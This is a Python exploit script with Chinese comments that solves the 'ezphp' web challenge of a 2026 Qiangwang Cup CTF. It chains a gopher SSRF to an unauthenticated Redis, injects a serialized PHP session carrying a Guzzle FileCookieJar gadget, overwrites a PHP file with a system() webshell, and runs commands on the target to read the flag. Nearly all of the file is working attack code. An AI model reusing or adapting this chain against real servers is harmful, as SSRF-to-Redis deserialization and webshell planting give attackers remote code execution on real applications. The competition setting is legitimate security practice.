#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""强网杯 2026 Web - ezphp  一键利用脚本

链条:
  /flag.php?url=gopher://...            # 协议黑名单漏掉 gopher, 可向 127.0.0.1 发送任意字节
        ↓
  127.0.0.1:6379 (Redis, 无认证)         # session.save_handler=redis, PHP 会话存在这里
        ↓
  SET PHPREDIS_SESSION:<sid> "k|O:..."  # php 序列化器 ⇒ session_start() 反序列化 ⇒ 任意对象注入
        ↓
  GuzzleHttp\\Cookie\\FileCookieJar::__destruct() → file_put_contents()
        ↓
  覆盖 /var/www/html/ocs/v1.php 为 webshell → uid=33(www-data) → cat /flag

用法:
  python exp_full.py <target> [命令]
  python exp_full.py https://eci-xxx.cloudeci1.ichunqiu.com "id; cat /flag"
"""
import re
import sys
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://eci-2zefx0aeksdknqbbcv9k.cloudeci1.ichunqiu.com"
CMD = sys.argv[2] if len(sys.argv) > 2 else "id; cat /flag"

SHELL_PATH = "/var/www/html/ocs/v1.php"      # 已存在且属于 www-data, 可被覆盖
SHELL_URL = "/ocs/v1.php"
PHP_CODE = "<?php if(isset($_GET[0])){system($_GET[0]);} ?>"

FCJ = "GuzzleHttp\\Cookie\\FileCookieJar"
CJ = "GuzzleHttp\\Cookie\\CookieJar"
SC = "GuzzleHttp\\Cookie\\SetCookie"


# ---------------------------------------------------------------- 传输层
def gopher(host_port: str, raw: bytes) -> bytes:
    """经由 /flag.php 的 SSRF 把原始字节发给 host_port

    flag.php 会拦截 URL 中的反斜杠, 而 curl 处理 gopher 时还会再做一次 %XX 解码,
    所以先把 '\\' 写成 %5C, NUL 由编码器写成 %00。
    """
    enc = "".join(
        "%%%02x" % b if (b < 0x20 or b == 0x7f or b in b"%?#[]@ ") else chr(b)
        for b in raw
    ).replace("\\", "%5C")
    url = "gopher://%s/_%s" % (host_port, enc)
    r = requests.get(TARGET + "/flag.php", params={"url": url}, timeout=25, verify=False)
    body = r.text.split("</pre>", 1)[-1] if "</pre>" in r.text else ""
    return body.encode("utf-8", "replace")


def redis(*args) -> str:
    out = b"*%d\r\n" % len(args)
    for a in args:
        a = a.encode() if isinstance(a, str) else a
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return gopher("127.0.0.1:6379", out).decode("utf-8", "replace")


# ---------------------------------------------------------------- 序列化构造
def js(x: str) -> str:
    b = x.encode()
    return 's:%d:"%s";' % (len(b), x)


def esc(x: str) -> str:
    """S: 格式 (\\XX 转义), 长度按解码后字节数 —— 用来塞入带 NUL 的私有属性名"""
    raw = x.encode()
    body = "".join("\\%02x" % b if (b < 0x20 or b > 0x7e or b == 0x5c) else chr(b) for b in raw)
    return 'S:%d:"%s";' % (len(raw), body)


def build_session(path: str, code: str) -> str:
    # SetCookie::$data = ['Name'=>'a', 'Value'=> <php code>] → 最终文件里就有可执行代码
    setcookie = 'O:%d:"%s":1:{%s}' % (
        len(SC), SC,
        esc("\x00%s\x00data" % SC) + "a:2:{%s%s%s%s}" % (js("Name"), js("a"), js("Value"), js(code)),
    )
    # 注意 storeSessionCookies=true, 否则 Guzzle 的 shouldPersist() 会跳过 session cookie
    obj = 'O:%d:"%s":3:{%s%s%s%s%s%s}' % (
        len(FCJ), FCJ,
        esc("\x00%s\x00filename" % FCJ), js(path),
        esc("\x00%s\x00storeSessionCookies" % FCJ), "b:1;",
        esc("\x00%s\x00cookies" % CJ), "a:1:{i:0;" + setcookie + "}",
    )
    return "pwn|" + obj


# ---------------------------------------------------------------- 利用
def main() -> None:
    print("[*] target:", TARGET)

    r = requests.get(TARGET + "/status.php", timeout=20, verify=False)
    print("[*] status.php:", r.text[:120])

    sess = requests.Session()
    sess.verify = False
    sess.get(TARGET + "/login", timeout=20)
    cookies = {c.name: c.value for c in sess.cookies}
    name = [k for k in cookies if re.fullmatch(r"oc[0-9a-z]+", k)][0]
    sid = cookies[name]
    key = "PHPREDIS_SESSION:" + sid
    print("[*] session %s = %s" % (name, sid))
    print("[*] redis GET:", redis("GET", key).split("\r\n")[0], "(session 存在 Redis)")

    payload = build_session(SHELL_PATH, PHP_CODE)
    print("[*] redis SET:", redis("SET", key, payload, "EX", "300").strip())

    # 触发 session_start(): 反序列化 → 对象析构 → 写文件
    sess.get(TARGET + "/login", timeout=20, cookies=cookies)
    redis("DEL", key)

    print("[*] exec:", CMD)
    out = requests.get(TARGET + SHELL_URL, params={"0": CMD}, timeout=30, verify=False).text
    print("-" * 60)
    print(out)
    m = re.search(r"flag\{[^}]*\}", out)
    if m:
        print("[+] FLAG:", m.group(0))


if __name__ == "__main__":
    main()
